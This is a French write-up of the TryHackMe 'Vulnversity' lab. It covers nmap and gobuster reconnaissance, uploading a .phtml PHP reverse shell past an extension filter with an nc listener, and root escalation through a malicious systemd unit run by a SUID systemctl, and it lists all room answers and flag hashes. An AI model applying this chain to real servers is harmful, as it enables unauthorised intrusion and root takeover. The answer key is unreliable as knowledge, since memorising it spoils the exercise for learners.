# TryHackMe: Vulnversity

**Objectif :** enumerer les services exposes, identifier le repertoire d'upload du site, contourner les restrictions sur les extensions de fichiers pour obtenir un shell web, puis elever les privileges via un binaire SUID `systemctl`.

---

## Introduction

La room **Vulnversity** est l'une des machines web les plus utiles pour travailler les reflexes de base :

- scan Nmap
- directory busting
- contournement de filtre d'upload
- exploitation de web shell PHP
- privilege escalation Linux via SUID

Elle est semi-guidee et pose des questions claires, ce qui en fait une tres bonne room pour constituer une methode reproductible.

---

## Task 1: Deploy the machine

Pas de difficulte ici : on deploie la cible, on attend qu'elle soit disponible, puis on passe a la reconnaissance.

### Reponse

`Done`

---

## Task 2: Reconnaissance

### Question 1: Scan the box, how many ports are open?

La room propose d'utiliser Nmap. Je lance :

```bash
nmap -sC -sV -T4 <IP>
```

Je retrouve **6 ports ouverts**.

### Reponse

**How many ports are open?** `6`

### Question 2: What version of the squid proxy is running on the machine?

Parmi les services detectes, on voit un proxy Squid dont la version remonte dans les resultats Nmap.

### Reponse

**Squid version:** `3.5.12`

### Question 3: How many ports will nmap scan if the flag -p-400 was used?

Cette question est theorique. L'option `-p-400` signifie que Nmap va scanner du port `1` au port `400`.

### Reponse

**Number of scanned ports:** `400`

### Question 4: Using the nmap flag -n what will it not resolve?

L'option `-n` desactive la resolution DNS.

### Reponse

**What will it not resolve?** `DNS`

### Question 5: What is the most likely operating system this machine is running?

Les empreintes de services orientent vers une distribution Ubuntu.

### Reponse

**Operating system:** `Ubuntu`

### Question 6: What port is the web server running on?

Le service HTTP exploitable dans la room ne tourne pas sur le port 80 mais sur :

```text
3333
```

### Reponse

**Web server port:** `3333`

---

## Task 3: Locating directories using GoBuster

Une fois le port web identifie, je lance une enumeration de repertoires.

```bash
gobuster dir -u http://<IP>:3333/ -w /usr/share/wordlists/dirb/common.txt
```

### Question 1: What is the directory that has an upload form page?

Le repertoire interessant qui ressort est :

```text
/internal/
```

En l'ouvrant dans le navigateur, on tombe bien sur un formulaire d'upload.

### Reponse

**Upload directory:** `/internal/`

---

## Task 4: Compromise the webserver

Le formulaire d'upload est la vraie porte d'entree de la machine. La question n'est pas seulement "peut-on envoyer un fichier ?", mais surtout "quel type de fichier le serveur acceptera-t-il encore comme interpretable ?".

### Identification du contournement

Les extensions PHP les plus evidentes sont filtrees. En revanche, une extension alternative reste acceptee et executee :

```text
.phtml
```

### Question 1: Run this attack, what extension is allowed?

### Reponse

**Allowed extension:** `phtml`

### Preparation du payload

Je copie un reverse shell PHP standard et je l'adapte a mon IP :

```bash
cp /usr/share/webshells/php/php-reverse-shell.php reverse.phtml
```

Je modifie ensuite :

- l'adresse IP de retour
- le port du listener

Puis je prepare l'ecoute :

```bash
rlwrap nc -lvnp 4444
```

J'upload ensuite `reverse.phtml` via le formulaire.

Une fois le fichier depose, il faut retrouver l'URL exacte de l'upload puis la visiter pour executer le shell.

### Question 2: What is the name of the user who manages the webserver?

Une fois le shell obtenu, je verifie le contexte :

```bash
whoami
```

Le compte applicatif est :

```text
bill
```

### Reponse

**Webserver user:** `bill`

### Question 3: What is the user flag?

Avec mon shell, je lis le flag dans le home de `bill`.

```bash
cat /home/bill/user.txt
```

### Reponse

**user.txt:** `8bd7992fbe8a6ad22a63361004cfcedb`

---

## Stabilisation du shell

Comme toujours avec un shell web, je prends le temps de le rendre un peu plus confortable.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Ensuite, je pars sur une enumeration locale classique :

```bash
id
hostname
uname -a
find / -type f -perm -4000 2>/dev/null
```

---

## Task 5: Privilege Escalation

### Question 1: On the system, search for all SUID files. What file stands out?

Dans la liste des SUID, le binaire anormal est :

```text
/bin/systemctl
```

`systemctl` ne devrait pas etre SUID. C'est donc la piste naturelle. Une unite systemd malicieuse suffit ensuite a convertir ce mauvais droit en execution de commande root.

### Reponse

**Suspicious SUID file:** `/bin/systemctl`

### Exploitation de systemctl

Le principe consiste a creer une unite systemd `oneshot` qui execute une commande arbitraire en root, puis a l'activer via le binaire SUID.

Je prepare une unite temporaire :

```bash
TF=$(mktemp).service
cat << 'EOF' > "$TF"
[Service]
Type=oneshot
ExecStart=/bin/sh -c 'cat /root/root.txt > /tmp/rootflag'
[Install]
WantedBy=multi-user.target
EOF
```

Puis je la charge :

```bash
/bin/systemctl link "$TF"
/bin/systemctl enable --now "$TF"
```

Enfin, je lis le resultat :

```bash
cat /tmp/rootflag
```

### Question 2: What is the root flag value?

### Reponse

**root.txt:** `a58ff8579f0a9270368d33a9966c7fd5`

---

## Resume des reponses de la room

- Scan the box, how many ports are open? `6`
- What version of the squid proxy is running on the machine? `3.5.12`
- How many ports will nmap scan if the flag -p-400 was used? `400`
- Using the nmap flag -n what will it not resolve? `DNS`
- What is the most likely operating system this machine is running? `Ubuntu`
- What port is the web server running on? `3333`
- What is the directory that has an upload form page? `/internal/`
- Run this attack, what extension is allowed? `phtml`
- What is the name of the user who manages the webserver? `bill`
- What is the user flag? `8bd7992fbe8a6ad22a63361004cfcedb`
- On the system, search for all SUID files. What file stands out? `/bin/systemctl`
- What is the root flag value? `a58ff8579f0a9270368d33a9966c7fd5`

---

## Commandes importantes

### Scan reseau

```bash
nmap -sC -sV -T4 <IP>
```

Base de toute la room. Permet d'identifier le port web non standard.

### Enumeration web

```bash
gobuster dir -u http://<IP>:3333/ -w /usr/share/wordlists/dirb/common.txt
```

Fait apparaitre `/internal/`.

### Preparation du web shell

```bash
cp /usr/share/webshells/php/php-reverse-shell.php reverse.phtml
```

Exploit le fait que `.phtml` reste interprete comme du PHP.

### Listener

```bash
rlwrap nc -lvnp 4444
```

Recoit la connexion sortante du shell web.

### Enumeration SUID

```bash
find / -type f -perm -4000 2>/dev/null
```

Met en evidence l'anomalie `systemctl`.

### Escalade

```bash
/bin/systemctl link "$TF"
/bin/systemctl enable --now "$TF"
```

Transforme le SUID mal place en execution root.

---

## Pourquoi cette room est utile

**Vulnversity** entraine deux competences tres concretes :

- ne pas s'arreter au premier filtre d'upload
- savoir reconnaitre un binaire SUID inhabituel

Le couple "upload bypass + privesc locale propre" correspond a une chaine d'attaque tres classique sur des environnements Linux web mal administres.

---

## Conclusion

Cette machine reste une excellente room de reference pour apprendre a passer d'un simple formulaire d'upload a une compromission complete. Tout est la : enumeration, validation d'hypothese, shell initial, puis privilege escalation solide et compréhensible.

***Auteur*** *: Saad Idrissi*
